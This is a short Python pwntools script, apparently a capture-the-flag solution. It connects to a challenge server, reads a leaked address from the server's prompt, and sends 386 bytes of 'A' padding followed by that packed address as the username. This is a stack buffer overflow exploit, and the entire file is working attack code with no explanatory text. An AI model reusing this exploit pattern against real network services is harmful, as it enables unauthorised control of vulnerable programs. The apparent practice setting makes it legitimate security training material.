#!/usr/bin/python3
import pwn
from pwn import *


offset = 386

sock=remote('challenge.us',11111)
secret = sock.recvline_startswith("Need to get to")
print(secret)
secret = (secret[-10:])
secret=(secret.decode("utf-8"))
key = p32(int(secret, 0))
print(key)
sock.recvline(1024) #Enter username
padding = "A" * offset
print(bytes(padding, "utf-8") + key)
sock.sendline(bytes(padding, "utf-8") + key) #Sends username
a = sock.recv(1024) #Hello, username, Enter Password
print(a)
sock.sendline("password")
a = sock.recvuntil(b"ESP: ")
print(a)
a = sock.recv(10)
print(a)
